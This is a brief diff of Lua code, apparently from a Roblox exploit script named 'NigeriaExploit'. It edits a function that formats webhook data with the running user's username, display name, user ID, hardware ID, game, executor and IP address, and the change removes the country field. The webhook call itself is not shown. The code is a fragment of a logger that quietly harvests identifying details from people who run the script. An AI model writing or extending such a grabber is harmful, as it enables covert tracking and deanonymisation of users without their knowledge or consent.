@@ -247,14 +247,13 @@ local function createWebhookData()
             {
                 ["title"] = "NigeriaExploit",
                 ["description"] = string.format(
-                    "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**Country:** %s\n**IP:** %s\n",
+                    "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s\n",
                     Username,
                     DisplayName,
                     UserId,
                     HWID,
                     GameName,
                     executor,
-                    Country,
                     GetIp
                 ),
                 ["thumbnail"] = {
